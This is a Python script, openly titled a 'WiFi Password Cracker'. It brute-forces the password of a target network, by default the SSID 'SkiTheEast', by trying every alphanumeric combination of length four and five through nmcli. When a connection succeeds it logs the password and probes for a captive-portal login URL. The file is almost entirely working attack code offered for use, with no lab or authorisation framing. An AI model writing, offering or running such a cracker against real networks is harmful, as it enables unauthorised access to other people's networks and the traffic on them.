import subprocess
import requests
import itertools
import string
import argparse
import logging
import sys
import time
from threading import Thread, Event

# -----------------------------
# Configuration and Constants
# -----------------------------

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("wifi_cracker.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Default configurations
DEFAULT_SSID = 'SkiTheEast'
DEFAULT_PASSWORD_LENGTHS = [4, 5]
CHARACTERS = string.ascii_letters + string.digits  # a-zA-Z0-9
REQUEST_TIMEOUT = 5  # seconds
DELAY_BETWEEN_ATTEMPTS = 0.1  # seconds

# Event to handle graceful termination
terminate_event = Event()

# -----------------------------
# Helper Functions
# -----------------------------

def connect_to_wifi(ssid, password):
    """
    Attempts to connect to the specified WiFi network using nmcli.

    Args:
        ssid (str): The SSID of the WiFi network.
        password (str): The password for the WiFi network.

    Returns:
        bool: True if connection is successful, False otherwise.
    """
    try:
        # Construct the nmcli command as a list to avoid shell=True
        connect_command = ['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password]
        logger.debug(f"Executing command: {' '.join(connect_command)}")
        subprocess.run(connect_command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logger.info(f"✅ Connected to WiFi network: {ssid}")
        return True
    except subprocess.CalledProcessError as e:
        logger.warning(f"❌ Failed to connect to WiFi network: {ssid} | Reason: {e.stderr.decode().strip()}")
        return False
    except Exception as e:
        logger.error(f"⚠️ Unexpected error during WiFi connection: {e}")
        return False

def detect_login_url():
    """
    Attempts to detect a login URL by accessing a known website and checking for redirection.

    Returns:
        str or None: The detected login URL if redirection occurs, else None.
    """
    test_url = "http://www.google.com"
    try:
        response = requests.get(test_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        if response.history:
            login_url = response.url
            logger.info(f"🔍 Detected login URL: {login_url}")
            return login_url
        else:
            logger.info("🔎 No redirection detected. Connected without captive portal.")
            return None
    except requests.RequestException as e:
        logger.error(f"⚠️ Failed to detect login URL | Reason: {e}")
        return None

def generate_combinations(length):
    """
    Generates all possible combinations of the specified length using the defined character set.

    Args:
        length (int): The length of the password combinations.

    Yields:
        str: The next password combination.
    """
    return itertools.product(CHARACTERS, repeat=length)

def password_cracker(ssid, password_lengths):
    """
    Attempts to brute-force WiFi passwords for the given SSID.

    Args:
        ssid (str): The SSID of the WiFi network.
        password_lengths (list): List of password lengths to attempt.
    """
    logger.info("🔓 WiFi Password Cracker Started")
    logger.info(f"📡 Target SSID: {ssid}")
    logger.info(f"🔑 Password Lengths: {password_lengths}")
    logger.info("🚀 Starting brute-force attack...")

    for length in password_lengths:
        logger.info(f"🔍 Attempting passwords of length: {length}")
        for combo in generate_combinations(length):
            if terminate_event.is_set():
                logger.info("⏹️ Termination signal received. Stopping password attempts.")
                return
            password = ''.join(combo)
            logger.debug(f"🔑 Trying password: {password}")
            success = connect_to_wifi(ssid, password)
            if success:
                login_url = detect_login_url()
                if login_url:
                    logger.info(f"🎉 Successful connection! Password: {password} | Login URL: {login_url}")
                else:
                    logger.info(f"🎉 Successful connection! Password: {password}")
                logger.info("🛑 Stopping brute-force attack.")
                return
            else:
                logger.debug(f"❌ Password {password} failed.")
            time.sleep(DELAY_BETWEEN_ATTEMPTS)  # To prevent overwhelming the system

    logger.warning("⚠️ Brute-force attack completed. Password not found within the specified lengths.")

def graceful_exit(signum=None, frame=None):
    """
    Sets the termination event to signal threads to stop.

    Args:
        signum: Signal number (optional).
        frame: Current stack frame (optional).
    """
    logger.info("🛑 Gracefully terminating the script...")
    terminate_event.set()

# -----------------------------
# Argument Parsing
# -----------------------------

def parse_arguments():
    """
    Parses command-line arguments.

    Returns:
        argparse.Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="WiFi Password Cracker using nmcli")
    parser.add_argument('-s', '--ssid', type=str, default=DEFAULT_SSID, help='SSID of the target WiFi network')
    parser.add_argument('-l', '--lengths', type=int, nargs='+', default=DEFAULT_PASSWORD_LENGTHS,
                        help='List of password lengths to attempt (e.g., -l 4 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging')
    return parser.parse_args()

# -----------------------------
# Main Function
# -----------------------------

def main():
    """
    Main entry point of the script.
    """
    args = parse_arguments()

    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("🔍 Verbose logging enabled.")

    # Register graceful termination handlers
    try:
        import signal
        signal.signal(signal.SIGINT, graceful_exit)
        signal.signal(signal.SIGTERM, graceful_exit)
    except Exception as e:
        logger.warning(f"⚠️ Could not set signal handlers: {e}")

    # Start the password cracker
    password_cracker(args.ssid, args.lengths)

    logger.info("🔚 Script execution completed.")

if __name__ == "__main__":
    main()
